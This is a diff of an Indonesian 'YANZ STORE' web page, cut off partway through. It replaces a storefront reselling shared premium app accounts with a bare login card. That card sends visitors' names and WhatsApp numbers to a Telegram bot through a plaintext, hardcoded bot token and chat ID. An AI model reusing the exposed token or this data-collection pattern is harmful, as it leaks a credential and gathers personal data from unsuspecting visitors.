@@ -1,686 +1,209 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.5, user-scalable=yes">
-    <title>YANZ STORE • Apps Premium + Telegram</title>
-    <!-- Font Awesome 6 -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-    <!-- Google Fonts: Poppins -->
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>YANZ STORE • Masuk</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Poppins', sans-serif;
+            font-family: 'Segoe UI', Roboto, system-ui, sans-serif;
         }
-
         body {
-            background: linear-gradient(145deg, #f6f9fc 0%, #e6f0f5 100%);
+            background: #111;
             min-height: 100vh;
-            padding: 10px;
-        }
-
-        #app {
-            max-width: 800px;
-            margin: 0 auto;
-            background: rgba(255,255,255,0.75);
-            backdrop-filter: blur(12px);
-            -webkit-backdrop-filter: blur(12px);
-            border-radius: 40px;
-            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.25);
-            padding: 20px;
-            border: 1px solid rgba(255,255,255,0.5);
-        }
-
-        .screen { transition: 0.3s; }
-
-        /* login screen */
-        #login-screen {
-            max-width: 480px;
-            margin: 20px auto;
-            background: white;
-            padding: 30px 20px;
-            border-radius: 32px;
-            box-shadow: 0 20px 35px -8px rgba(0,20,30,0.2);
-            text-align: center;
-            border: 1px solid rgba(255,215,0,0.3);
-        }
-
-        #login-screen h1 {
-            font-size: 2rem;
-            font-weight: 700;
-            background: linear-gradient(135deg, #1e2b3a, #2c3e50);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            margin-bottom: 8px;
-        }
-        #login-screen p { color: #4a5b6e; margin-bottom: 25px; font-weight: 300; font-size: 0.95rem; }
-
-        .input-group { margin-bottom: 18px; text-align: left; }
-        .input-group label { font-weight: 500; color: #2c3e50; display: block; margin-bottom: 5px; font-size: 0.9rem; }
-        .input-group input {
-            width: 100%; padding: 14px 18px; border: 2px solid #e0e7ed; border-radius: 60px;
-            font-size: 1rem; background: #f9fcff;
-        }
-        .input-group input:focus { border-color: #f1c40f; outline: none; box-shadow: 0 0 0 4px #f1c40f33; }
-
-        .btn {
-            background: #2c3e50; color: white; border: none; padding: 14px 25px; border-radius: 60px;
-            font-weight: 600; font-size: 1rem; cursor: pointer; transition: 0.2s;
-            box-shadow: 0 10px 15px -5px rgba(44,62,80,0.3); width: 100%;
-        }
-        .btn:hover { background: #1e2b3a; transform: scale(1.02); }
-        .btn-gold { background: #f1c40f; color: #1e2b3a; box-shadow: 0 10px 15px -5px #f1c40f80; }
-        .btn-gold:hover { background: #d4ac0d; }
-
-        /* store header */
-        .store-header {
-            display: flex; justify-content: space-between; align-items: center;
-            margin-bottom: 15px; flex-wrap: wrap; gap: 10px;
-        }
-        .store-header h2 { font-size: 1.8rem; background: linear-gradient(145deg, #2c3e50, #1a2632); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-        .user-badge {
-            background: white; padding: 8px 16px; border-radius: 60px; box-shadow: 0 5px 15px rgba(0,0,0,0.05);
-            font-weight: 500; font-size: 0.9rem; white-space: nowrap;
-        }
-        .user-badge i { color: #f1c40f; margin-right: 6px; }
-
-        /* ===== CART STICKY (di atas) ===== */
-        .cart-sticky {
-            position: sticky;
-            top: 0;
-            z-index: 20;
-            background: white;
-            border-radius: 28px;
-            padding: 16px 18px;
-            margin-bottom: 25px;
-            box-shadow: 0 15px 30px -10px rgba(0,0,0,0.15);
-            border: 1px solid #f1c40f40;
-            max-height: 40vh;
-            overflow-y: auto;
-        }
-
-        .cart-sticky h3 {
-            font-size: 1.2rem; margin-bottom: 12px; display: flex; align-items: center; gap: 8px;
-            color: #1e2b3a;
-        }
-        .cart-item {
-            display: flex; justify-content: space-between; align-items: center;
-            padding: 8px 0; border-bottom: 1px solid #ecf1f6; gap: 6px;
-        }
-        .cart-item-info { flex: 2; min-width: 0; }
-        .cart-item-title { font-weight: 500; font-size: 0.85rem; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
-        .cart-item-price { font-size: 0.75rem; color: #5d6d7e; }
-        .cart-item-qty { display: flex; align-items: center; gap: 5px; flex-shrink: 0; }
-        .qty-btn {
-            background: #ecf1f6; border: none; width: 28px; height: 28px; border-radius: 30px;
-            font-weight: bold; cursor: pointer; font-size: 1rem;
-            display: inline-flex; align-items: center; justify-content: center;
-        }
-        .qty-btn:hover { background: #d0dae6; }
-        .cart-total {
-            margin-top: 15px; font-size: 1.2rem; font-weight: 700;
-            display: flex; justify-content: space-between; border-top: 3px dashed #f1c40f; padding-top: 12px;
-        }
-
-        /* ===== PRODUK ===== */
-        .product-list { display: flex; flex-direction: column; gap: 12px; }
-
-        .product-item {
-            background: white; border-radius: 24px; padding: 0;
-            border: 1px solid #e9edf2; overflow: hidden;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.02);
-        }
-
-        .product-name {
-            padding: 18px 20px;
-            font-weight: 600;
-            font-size: 1.05rem;
-            color: #1e2b3a;
-            cursor: pointer;
-            background: #ffffff;
-            transition: background 0.1s;
             display: flex;
+            justify-content: center;
             align-items: center;
-            justify-content: space-between;
+            padding: 16px;
+            color: #fff;
         }
-        .product-name:after {
-            content: '\f078';
-            font-family: 'Font Awesome 6 Free';
-            font-weight: 900;
+        .card {
+            max-width: 450px;
+            width: 100%;
+            background: #1e1e1e;
+            border-radius: 48px;
+            box-shadow: 0 30px 60px -15px rgba(0,0,0,0.8);
+            padding: 40px 32px;
+            border: 1px solid #333;
+            text-align: center;
+        }
+        h1 {
+            font-size: 2.2rem;
+            font-weight: 700;
+            color: #fff;
+            margin-bottom: 8px;
+            letter-spacing: -0.5px;
+        }
+        .sub {
+            color: #aaa;
+            margin-bottom: 32px;
+            font-size: 1rem;
+            border-left: 4px solid #888;
+            padding-left: 16px;
+            background: #2a2a2a;
+            border-radius: 0 16px 16px 0;
+            line-height: 1.4;
+            text-align: left;
+        }
+        .input-group {
+            margin-bottom: 24px;
+            text-align: left;
+        }
+        .input-group label {
+            font-weight: 600;
             font-size: 0.9rem;
-            color: #f1c40f;
-            transition: transform 0.2s;
-        }
-        .product-item.expanded .product-name:after {
-            transform: rotate(180deg);
-        }
-
-        .product-detail {
-            background: #f8fafd;
-            padding: 0 20px 18px 20px;
-            border-top: 1px dashed #d0dae6;
-            display: none;
-        }
-        .product-item.expanded .product-detail {
+            color: #ccc;
             display: block;
+            margin-bottom: 6px;
+            margin-left: 4px;
+            text-transform: uppercase;
+            letter-spacing: 0.3px;
         }
-
-        .product-price {
-            font-weight: 700; font-size: 1.3rem; color: #2c3e50; margin: 8px 0 4px;
+        .input-group input {
+            width: 100%;
+            padding: 16px 20px;
+            background: #2a2a2a;
+            border: 2px solid #444;
+            border-radius: 32px;
+            font-size: 1rem;
+            color: #fff;
+            transition: 0.15s;
         }
-        .product-price::before { content: 'Rp'; font-size: 0.9rem; font-weight: 500; margin-right: 4px; color: #7f8c8d; }
-        .product-desc { font-size: 0.85rem; color: #5d6d7e; margin-bottom: 14px; }
-        .btn-add {
-            background: #2c3e50; color: white; border: none; border-radius: 40px;
-            padding: 12px 20px; font-weight: 600; font-size: 0.95rem;
-            cursor: pointer; transition: 0.2s; width: 100%;
+        .input-group input:focus {
+            border-color: #888;
+            outline: none;
+            box-shadow: 0 0 0 4px rgba(255,255,255,0.1);
         }
-        .btn-add:hover { background: #1e2b3a; }
-
-        /* payment screen */
-        #payment-screen {
-            max-width: 600px; margin: 0 auto; background: white; border-radius: 40px;
-            padding: 30px 20px; box-shadow: 0 20px 40px -15px #00000030;
+        .btn-primary {
+            background: #fff;
+            color: #111;
+            border: none;
+            width: 100%;
+            padding: 18px 24px;
+            font-size: 1.2rem;
+            font-weight: 700;
+            border-radius: 60px;
+            cursor: pointer;
+            transition: 0.15s;
+            margin-top: 10px;
+            letter-spacing: 0.5px;
         }
-        .payment-header { text-align: center; margin-bottom: 20px; }
-        .payment-total-big { font-size: 2.2rem; font-weight: 700; color: #1e2b3a; word-break: break-word; }
-        .qris-box {
-            background: #f0f4f9; border-radius: 30px; padding: 20px;
-            display: flex; flex-direction: column; align-items: center; margin: 20px 0;
-            border: 2px dashed #f1c40f;
+        .btn-primary:hover {
+            background: #ddd;
         }
-        .qris-placeholder {
-            width: 180px; height: 180px; background: #2c3e50; border-radius: 30px;
-            display: flex; align-items: center; justify-content: center; color: white;
-            font-weight: 600; font-size: 1rem; margin-bottom: 12px;
-            background: linear-gradient(145deg, #2c3e50, #1e2b3a); flex-direction: column;
+        .footer-note {
+            font-size: 0.85rem;
+            color: #777;
+            text-align: center;
+            margin-top: 30px;
         }
-        .qris-placeholder i { font-size: 3rem; margin-bottom: 8px; }
-        .payment-numbers {
-            background: #ecf1f6; border-radius: 50px; padding: 16px 20px; margin: 20px 0;
-            font-size: 1rem; display: flex; flex-wrap: wrap; gap: 20px; justify-content: center;
+        .footer-note span {
+            background: #2a2a2a;
+            padding: 5px 16px;
+            border-radius: 60px;
+            border: 1px solid #444;
         }
-        .payment-numbers div {
-            display: flex; align-items: center; gap: 8px; background: white;
-            padding: 6px 16px; border-radius: 40px; box-shadow: 0 2px 6px rgba(0,0,0,0.05);
-        }
-        .payment-numbers i { color: #f1c40f; width: 20px; }
-        .payment-numbers span { font-weight: 700; color: #1e2b3a; }
-        .wa-btn {
-            background: #25D366; color: white; border: none; border-radius: 60px; padding: 16px;
-            width: 100%; font-weight: 700; font-size: 1.2rem; display: flex; align-items: center;
-            justify-content: center; gap: 12px; margin: 20px 0 12px; cursor: pointer;
-        }
-        .wa-btn:hover { background: #20b859; }
-
-        /* admin panel */
-        #admin-screen { background: white; border-radius: 40px; padding: 25px 15px; }
-        .admin-section { background: #f8fafd; border-radius: 28px; padding: 20px; margin-bottom: 25px; }
-        .admin-item {
-            display: grid; grid-template-columns: 2fr 1fr 2fr auto; gap: 8px; margin-bottom: 12px;
-            align-items: center;
-        }
-        .admin-item input, .admin-item textarea {
-            padding: 8px 10px; border-radius: 30px; border: 1px solid #ccd7e4; font-size: 0.85rem; width: 100%;
-        }
-        .btn-small {
-            background: #e74c3c; color: white; border: none; border-radius: 30px;
-            padding: 8px 12px; cursor: pointer; font-weight: 500; font-size: 0.8rem; white-space: nowrap;
-        }
-        #admin-link {
-            background: #2c3e50; color: white; padding: 10px 18px; border-radius: 60px;
-            font-weight: 600; box-shadow: 0 5px 20px rgba(0,0,0,0.2); transition: 0.2s;
-            position: fixed; bottom: 20px; right: 20px; z-index: 999; cursor: pointer; font-size: 0.9rem;
-        }
-        #admin-link:hover { background: #f1c40f; color: #1e2b3a; }
-        .text-muted { color: #7f8c8d; font-size: 0.85rem; margin-top: 5px; }
-
-        /* mobile extra */
-        @media screen and (max-width: 480px) {
-            #app { padding: 15px; }
-            .cart-sticky { padding: 12px; }
-            .product-name { padding: 15px 16px; font-size: 1rem; }
-            .payment-total-big { font-size: 1.8rem; }
-            .payment-numbers { flex-direction: column; align-items: stretch; gap: 10px; }
-            .payment-numbers div { justify-content: center; }
-            .admin-item { grid-template-columns: 1fr; }
+        .loading {
+            display: none;
+            color: #aaa;
+            margin-top: 16px;
         }
     </style>
 </head>
 <body>
-<div id="app">
-    <!-- LOGIN SCREEN -->
-    <div id="login-screen" class="screen">
-        <h1>✨ YANZ STORE</h1>
-        <p>Klik produk → muncul harga</p>
-        <form id="login-form">
+    <div class="card">
+        <h1>✦ YANZ STORE ✦</h1>
+        <div class="sub">Masukkan data untuk melanjutkan</div>
+
+        <form id="loginForm">
             <div class="input-group">
-                <label><i class="fas fa-user"></i> Nama lengkap</label>
-                <input type="text" id="login-name" placeholder="Contoh: Budi Santoso" required>
+                <label for="nama">Nama Lengkap</label>
+                <input type="text" id="nama" placeholder="Contoh: Budi Santoso" required>
             </div>
             <div class="input-group">
-                <label><i class="fas fa-phone-alt"></i> Nomor WhatsApp</label>
-                <input type="tel" id="login-phone" placeholder="08123456789" required>
+                <label for="nomor">Nomor WhatsApp</label>
+                <input type="tel" id="nomor" placeholder="08123456789" required>
             </div>
-            <button type="submit" class="btn btn-gold"><i class="fas fa-sign-in-alt"></i> Masuk ke Store</button>
+            <button type="submit" class="btn-primary" id="submitBtn">🚀 MASUK</button>
+            <div class="loading" id="loading">Mengirim data...</div>
         </form>
-        <div class="text-muted" style="margin-top: 20px;"><i class="fas fa-robot"></i> *Data dikirim ke Telegram admin</div>
+
+        <div class="footer-note">
+            <span>🔒 Data dikirim via Telegram</span>
+        </div>
     </div>
 
-    <!-- STORE SCREEN (keranjang sticky + produk) -->
-    <div id="store-screen" class="screen" style="display: none;">
-        <div class="store-header">
-            <h2><i class="fas fa-store-alt"></i> YANZ STORE</h2>
-            <div class="user-badge" id="user-display"><i class="fas fa-user-circle"></i> <span id="display-name"></span></div>
-        </div>
+    <script>
+        // ==================== KONFIGURASI TELEGRAM ====================
+        const TELEGRAM_TOKEN = '8394702906:AAFp5Hp3xLyH5HUc--EQQ6V1VFC-xzJXr4Q';
+        const TELEGRAM_CHAT_ID = '7375181920';
 
-        <!-- CART STICKY -->
-        <div class="cart-sticky" id="cart-sticky">
-            <h3><i class="fas fa-shopping-cart"></i> Keranjang</h3>
-            <div id="cart-items-container"></div>
-            <div class="cart-total">
-                <span>Total</span>
-                <span id="cart-total-amount">Rp0</span>
-            </div>
-            <button class="btn btn-gold" id="checkout-btn" style="width:100%; margin-top:15px;" disabled>⏳ Checkout</button>
-        </div>
+        // ==================== KIRIM KE TELEGRAM ====================
+        async function sendToTelegram(nama, nomor) {
+            const message = `🔔 *Pengunjung Baru YANZ STORE* 🔔\n\n👤 *Nama*: ${nama}\n📞 *No. WA*: ${nomor}\n⏰ *Waktu*: ${new Date().toLocaleString('id-ID')}`;
+            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
 
-        <!-- DAFTAR PRODUK -->
-        <div class="product-list" id="product-list-container"></div>
-    </div>
-
-    <!-- PAYMENT SCREEN -->
-    <div id="payment-screen" class="screen" style="display: none;">
-        <div class="payment-header">
-            <h2><i class="fas fa-credit-card"></i> Selesaikan Pembayaran</h2>
-            <div class="payment-total-big" id="payment-total">Rp0</div>
-        </div>
-        <div class="qris-box">
-            <div class="qris-placeholder"><i class="fas fa-qrcode"></i> QRIS.JPG</div>
-            <p style="font-weight:500;">Scan QRIS di atas</p>
-        </div>
-        <div class="payment-numbers">
-            <div><i class="fas fa-university"></i> DANA: <span id="dana-display">085283380274</span></div>
-            <div><i class="fas fa-mobile-alt"></i> GOPAY: <span id="gopay-display">085283380274</span></div>
-        </div>
-        <button class="wa-btn" id="confirm-wa"><i class="fab fa-whatsapp"></i> Konfirmasi via WhatsApp</button>
-        <button class="btn" id="back-to-store" style="background:#ecf1f6; color:#2c3e50;">← Kembali ke produk</button>
-    </div>
-
-    <!-- ADMIN PANEL -->
-    <div id="admin-screen" class="screen" style="display: none;">
-        <h2 style="margin-bottom:20px;"><i class="fas fa-lock"></i> Panel Admin YANZ</h2>
-        <div class="admin-section">
-            <h3>🔧 Pengaturan Toko & Telegram</h3>
-            <div style="display:grid; gap:15px; grid-template-columns:1fr 1fr;" class="admin-settings-grid">
-                <div><label>Nomor Admin WhatsApp (dengan kode negara):</label><input type="text" id="admin-wa-input" value="6285283380274" class="admin-input"></div>
-                <div><label>Nomor DANA:</label><input type="text" id="admin-dana-input" value="085283380274" class="admin-input"></div>
-                <div><label>Nomor GOPAY:</label><input type="text" id="admin-gopay-input" value="085283380274" class="admin-input"></div>
-                <div><label>Token Bot Telegram:</label><input type="text" id="admin-telegram-token" value="" placeholder="isi token bot" class="admin-input"></div>
-                <div><label>Chat ID Telegram:</label><input type="text" id="admin-telegram-chatid" value="" placeholder="contoh: 123456789" class="admin-input"></div>
-            </div>
-            <button id="save-settings" class="btn" style="margin-top:20px; width:auto;">💾 Simpan Pengaturan</button>
-        </div>
-        <div class="admin-section">
-            <h3>📦 Edit Produk (per kategori)</h3>
-            <div id="admin-products-container"></div>
-            <button id="add-category-btn" class="btn btn-gold" style="margin-top:20px;">+ Tambah Kategori Baru</button>
-            <button id="save-products-admin" class="btn" style="margin-top:10px;">💾 Simpan Semua Perubahan Produk</button>
-        </div>
-        <button id="admin-logout" class="btn" style="background:#e74c3c; margin-top:20px;"> Keluar Admin</button>
-    </div>
-
-    <!-- admin link -->
-    <div id="admin-link" title="Admin panel"><i class="fas fa-cog"></i> Admin</div>
-</div>
-
-<script>
-    (function() {
-        // ---------- DEFAULT DATA ----------
-        const defaultProducts = [
-            { id: 'p1', category: 'CHATGPT PLUS', name: 'sharing 1 bulan 7u', price: 4000, description: '' },
-            { id: 'p2', category: 'CHATGPT PLUS', name: 'private 1 bulan nogar', price: 7000, description: '' },
-            { id: 'p3', category: 'CHATGPT PLUS', name: 'private 1 bulan fullgar', price: 13000, description: '' },
-            { id: 'p4', category: 'CHATGPT BUSINESS', name: 'private 1 bulan via invite', price: 5000, description: '' },
-            { id: 'p5', category: 'CHATGPT BUSINESS', name: 'head 1 bulan fullgar', price: 14000, description: 'head bisa invite 4 email !' },
-            { id: 'p6', category: 'CAPCUT PRO', name: 'private 7 hari', price: 800, description: '' },
-            { id: 'p7', category: 'CAPCUT PRO', name: 'private 28 hari', price: 5000, description: '' },
-            { id: 'p8', category: 'CAPCUT PRO', name: 'private 35 hari', price: 5500, description: '' },
-            { id: 'p9', category: 'CAPCUT PRO', name: 'private 42 hari', price: 6000, description: 'full garansi backfree' },
-            { id: 'p10', category: 'ALIGHT MOTION', name: '1 tahun akun buyer', price: 350, description: '' },
-            { id: 'p11', category: 'ALIGHT MOTION', name: 'priv 1 tahun generator', price: 100, description: '' },
-            { id: 'p12', category: 'ALIGHT MOTION', name: 'bulk 100 akun generator', price: 1000, description: '' },
-            { id: 'p13', category: 'CANVA', name: 'member 1 bulan', price: 100, description: '' },
-            { id: 'p14', category: 'CANVA', name: 'design 1 bulan', price: 200, description: '' },
-            { id: 'p15', category: 'CANVA', name: 'education lifetime gar 6b', price: 600, description: '' },
-            { id: 'p16', category: 'CANVA', name: 'canva head 1 bulan', price: 3000, description: '' },
-            { id: 'p17', category: 'GEMINI PRO', name: 'sharing 1 bulan', price: 1000, description: '' },
-            { id: 'p18', category: 'GEMINI PRO', name: 'priv akun buyer 1 bulan', price: 2000, description: '' },
-            { id: 'p19', category: 'APPLE MUSIC', name: 'famplan 1 bulan via invite', price: 1000, description: '' },
-            { id: 'p20', category: 'APPLE MUSIC', name: 'head 1 bulan', price: 6500, description: '' },
-            { id: 'p21', category: 'APPLE MUSIC', name: 'indplan 1 bulan', price: 6500, description: '' },
-            { id: 'p22', category: 'LOKLOK', name: 'standar no login tv 1 bulan', price: 20000, description: '' },
-            { id: 'p23', category: 'VIU ANLIM / PLUS', name: 'private 1 tahun', price: 100, description: 'plan viu udah jadi 1 paket yaw' },
-            { id: 'p24', category: 'VIU ANLIM / PLUS', name: 'private lifetime', price: 300, description: '' },
-            { id: 'p25', category: 'VIDIOO', name: 'private only tv 1 tahun', price: 2500, description: '' },
-            { id: 'p26', category: 'VIDIOO', name: 'private mobile 1 bulan', price: 19500, description: '' },
-            { id: 'p27', category: 'YOUTUBE', name: 'famplan 1 bulan', price: 900, description: '' },
-            { id: 'p28', category: 'YOUTUBE', name: 'jaspay youtube', price: 1500, description: 'indp atau head? sebutkan plan' },
-            { id: 'p29', category: 'YOUTUBE', name: 'jaspay jasver youtube', price: 1900, description: 'indp atau head? sebutkan plan' },
-            { id: 'p30', category: 'GET CONTACT', name: '1 bulan nomor buyer', price: 7000, description: 'otp fast' },
-            { id: 'p31', category: 'GET CONTACT', name: 'cek nomor gtc', price: 50, description: '' }
-        ];
-
-        const defaultSettings = {
-            adminWa: '6285283380274',
-            dana: '085283380274',
-            gopay: '085283380274',
-            telegramToken: '7375181920',
-            telegramChatId: '8394702906:AAFp5Hp3xLyH5HUc--EQQ6V1VFC-xzJXr4Q'
-        };
-
-        // State
-        let products = JSON.parse(localStorage.getItem('yanz_products')) || defaultProducts;
-        let settings = JSON.parse(localStorage.getItem('yanz_settings')) || defaultSettings;
-        let cart = {};
-        let loggedInUser = JSON.parse(localStorage.getItem('yanz_user')) || null;
-
-        function saveProducts() { localStorage.setItem('yanz_products', JSON.stringify(products)); }
-        function saveSettings() { localStorage.setItem('yanz_settings', JSON.stringify(settings)); }
-        function saveUser() {
-            if (loggedInUser) localStorage.setItem('yanz_user', JSON.stringify(loggedInUser));
-            else localStorage.removeItem('yanz_user');
-        }
-
-        // Fungsi kirim ke Telegram (real)
-        async function sendToTelegram(name, phone) {
-            const token = settings.telegramToken;
-            const chatId = settings.telegramChatId;
-            if (!token || !chatId) {
-                alert('⚠️ Admin belum mengatur Token/Chat ID Telegram. Data tidak terkirim, tetapi login tetap berhasil.');
-                return;
-            }
-            const text = `🔔 *Login Baru di YANZ STORE*%0A• Nama: ${name}%0A• No. HP: ${phone}`;
-            const url = `https://api.telegram.org/bot${token}/sendMessage`;
             try {
                 const response = await fetch(url, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        chat_id: chatId,
-                        text: text.replace(/%0A/g, '\n'),
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
                         parse_mode: 'Markdown'
                     })
                 });
                 const result = await response.json();
                 if (result.ok) {
-                    alert('✅ Data login berhasil dikirim ke Telegram admin.');
+                    return true;
                 } else {
-                    alert('❌ Gagal mengirim ke Telegram: ' + result.description);
+                    console.error('Gagal kirim:', result);
+                    return false;
                 }
             } catch (error) {
-                alert('❌ Error koneksi ke Telegram: ' + error.message);
+                console.error('Error:', error);
+                return false;
             }
         }
 
-        // Render login
-        function renderLoginScreen() {
-            document.getElementById('login-screen').style.display = 'block';
-            document.getElementById('store-screen').style.display = 'none';
-            document.getElementById('payment-screen').style.display = 'none';
-            document.getElementById('admin-screen').style.display = 'none';
-        }
-
-        // Render keranjang
-        function renderCart() {
-            const container = document.getElementById('cart-items-container');
-            let total = 0;
-            let itemsHtml = '';
-            for (let id in cart) {
-                const item = cart[id];
-                const subtotal = item.product.price * item.quantity;
-                total += subtotal;
-                itemsHtml += `<div class="cart-item">
-                    <div class="cart-item-info">
-                        <div class="cart-item-title">${item.product.name}</div>
-                        <div class="cart-item-price">Rp${item.product.price.toLocaleString()} x ${item.quantity}</div>
-                    </div>
-                    <div class="cart-item-qty">
-                        <button class="qty-btn dec-cart" data-id="${id}">-</button>
-                        <span>${item.quantity}</span>
-                        <button class="qty-btn inc-cart" data-id="${id}">+</button>
-                        <button class="qty-btn" style="background:#e74c3c; color:white;" data-id="${id}" data-remove="true"><i class="fas fa-trash"></i></button>
-                    </div>
-                </div>`;
-            }
-            container.innerHTML = itemsHtml || '<p style="color:#999; text-align:center;">Keranjang kosong</p>';
-            document.getElementById('cart-total-amount').innerText = `Rp${total.toLocaleString()}`;
-            document.getElementById('checkout-btn').disabled = total === 0;
-
-            document.querySelectorAll('.dec-cart').forEach(btn => {
-                btn.addEventListener('click', (e) => {
-                    const id = e.currentTarget.dataset.id;
-                    if (cart[id]?.quantity > 1) cart[id].quantity--;
-                    else delete cart[id];
-                    renderCart();
-                });
-            });
-            document.querySelectorAll('.inc-cart').forEach(btn => {
-                btn.addEventListener('click', (e) => {
-                    const id = e.currentTarget.dataset.id;
-                    if (cart[id]) cart[id].quantity++;
-                    renderCart();
-                });
-            });
-            document.querySelectorAll('[data-remove]').forEach(btn => {
-                btn.addEventListener('click', (e) => {
-                    const id = e.currentTarget.dataset.id;
-                    delete cart[id];
-                    renderCart();
-                });
-            });
-        }
-
-        // Render store
-        function renderStore() {
-            if (!loggedInUser) return renderLoginScreen();
-            document.getElementById('login-screen').style.display = 'none';
-            document.getElementById('store-screen').style.display = 'block';
-            document.getElementById('payment-screen').style.display = 'none';
-            document.getElementById('admin-screen').style.display = 'none';
-            document.getElementById('display-name').innerText = loggedInUser.name;
-
-            const grouped = {};
-            products.forEach(p => {
-                if (!grouped[p.category]) grouped[p.category] = [];
-                grouped[p.category].push(p);
-            });
-
-            let html = '';
-            for (let cat in grouped) {
-                html += `<div style="margin-top:10px;"><h4 style="margin-left:5px; color:#2c3e50;">✧ ${cat}</h4></div>`;
-                grouped[cat].forEach(p => {
-                    html += `<div class="product-item" data-id="${p.id}">
-                        <div class="product-name">${p.name}</div>
-                        <div class="product-detail">
-                            <div class="product-price">${p.price.toLocaleString()}</div>
-                            <div class="product-desc">${p.description || '-'}</div>
-                            <button class="btn-add add-to-cart" data-id="${p.id}"><i class="fas fa-cart-plus"></i> Tambah ke keranjang</button>
-                        </div>
-                    </div>`;
-                });
-            }
-            document.getElementById('product-list-container').innerHTML = html;
-
-            document.querySelectorAll('.product-name').forEach(el => {
-                el.addEventListener('click', function(e) {
-                    const parent = this.closest('.product-item');
-                    parent.classList.toggle('expanded');
-                });
-            });
-
-            document.querySelectorAll('.add-to-cart').forEach(btn => {
-                btn.addEventListener('click', (e) => {
-                    e.stopPropagation();
-                    const id = e.currentTarget.dataset.id;
-                    const product = products.find(p => p.id === id);
-                    if (product) {
-                        if (!cart[id]) cart[id] = { product, quantity: 1 };
-                        else cart[id].quantity++;
-                        renderCart();
-                    }
-                });
-            });
-
-            renderCart();
-        }
-
-        function renderPayment() {
-            if (!loggedInUser) return renderLoginScreen();
-            let total = Object.values(cart).reduce((acc, i) => acc + (i.product.price * i.quantity), 0);
-            document.getElementById('payment-total').innerText = `Rp${total.toLocaleString()}`;
-            document.getElementById('dana-display').innerText = settings.dana;
-            document.getElementById('gopay-display').innerText = settings.gopay;
-            document.getElementById('login-screen').style.display = 'none';
-            document.getElementById('store-screen').style.display = 'none';
-            document.getElementById('payment-screen').style.display = 'block';
-            document.getElementById('admin-screen').style.display = 'none';
-        }
-
-        function buildWaMessage() {
-            let msg = `Halo admin YANZ STORE, saya *${loggedInUser.name}* (No. HP: ${loggedInUser.phone}) ingin mengkonfirmasi pesanan:%0a`;
-            for (let id in cart) {
-                const item = cart[id];
-                msg += `- ${item.product.name} x${item.quantity} @ Rp${item.product.price.toLocaleString()} = Rp${(item.product.price * item.quantity).toLocaleString()}%0a`;
-            }
-            let total = Object.values(cart).reduce((acc, i) => acc + (i.product.price * i.quantity), 0);
-            msg += `%0a*Total: Rp${total.toLocaleString()}*%0a`;
-            msg += `Saya telah melakukan pembayaran via [DANA/GOPAY/QRIS]. Berikut bukti transaksi (sertakan gambar).%0a`;
-            msg += `Saya membeli dari website YANZ STORE. Terima kasih.`;
-            return msg;
-        }
-
-        // Admin render
-        function renderAdmin() {
-            document.getElementById('login-screen').style.display = 'none';
-            document.getElementById('store-screen').style.display = 'none';
-            document.getElementById('payment-screen').style.display = 'none';
-            document.getElementById('admin-screen').style.display = 'block';
-
-            document.getElementById('admin-wa-input').value = settings.adminWa;
-            document.getElementById('admin-dana-input').value = settings.dana;
-            document.getElementById('admin-gopay-input').value = settings.gopay;
-            document.getElementById('admin-telegram-token').value = settings.telegramToken || '';
-            document.getElementById('admin-telegram-chatid').value = settings.telegramChatId || '';
-
-            const grouped = {};
-            products.forEach(p => { if (!grouped[p.category]) grouped[p.category] = []; grouped[p.category].push(p); });
-
-            let adminHtml = '';
-            for (let cat in grouped) {
-                adminHtml += `<div style="margin-bottom:25px; border-left:4px solid #f1c40f; padding-left:12px;"><h4>📁 ${cat}</h4>`;
-                grouped[cat].forEach(p => {
-                    adminHtml += `<div class="admin-item" data-id="${p.id}">
-                        <input type="text" class="admin-prod-name" value="${p.name.replace(/"/g, '&quot;')}" placeholder="nama">
-                        <input type="number" class="admin-prod-price" value="${p.price}" placeholder="harga">
-                        <input type="text" class="admin-prod-desc" value="${(p.description || '').replace(/"/g, '&quot;')}" placeholder="deskripsi">
-                        <button class="btn-small delete-prod" data-id="${p.id}"><i class="fas fa-times"></i></button>
-                    </div>`;
-                });
-                adminHtml += `<button class="btn-small add-item" data-cat="${cat}" style="background:#2ecc71;">+ Tambah item</button></div>`;
-            }
-            adminHtml += `<div style="margin-top:30px;"><h4>➕ Kategori Baru</h4><input type="text" id="new-cat-name" placeholder="Nama kategori"><button id="create-cat" class="btn-small" style="background:#3498db;">Buat</button></div>`;
-            document.getElementById('admin-products-container').innerHTML = adminHtml;
-
-            document.querySelectorAll('.delete-prod').forEach(btn => {
-                btn.addEventListener('click', (e) => {
-                    const id = e.currentTarget.dataset.id;
-                    products = products.filter(p => p.id !== id);
-                    saveProducts(); renderAdmin();
-                });
-            });
-            document.querySelectorAll('.add-item').forEach(btn => {
-                btn.addEventListener('click', (e) => {
-                    const cat = e.currentTarget.dataset.cat;
-                    const newId = 'p' + Date.now() + Math.random();
-                    products.push({ id: newId, category: cat, name: 'item baru', price: 1000, description: '' });
-                    saveProducts(); renderAdmin();
-                });
-            });
-            document.getElementById('create-cat')?.addEventListener('click', () => {
-                const newCat = document.getElementById('new-cat-name').value.trim();
-                if (newCat) {
-                    products.push({ id: 'p'+Date.now(), category: newCat, name: 'contoh produk', price: 5000, description: '' });
-                    saveProducts(); renderAdmin();
-                }
-            });
-        }
-
-        // Event listeners
-        document.getElementById('login-form').addEventListener('submit', async (e) => {
+        // ==================== HANDLE FORM ====================
+        document.getElementById('loginForm').addEventListener('submit', async (e) => {
             e.preventDefault();
-            const name = document.getElementById('login-name').value.trim();
-            const phone = document.getElementById('login-phone').value.trim();
-            if (name && phone) {
-                loggedInUser = { name, phone };
-                saveUser();
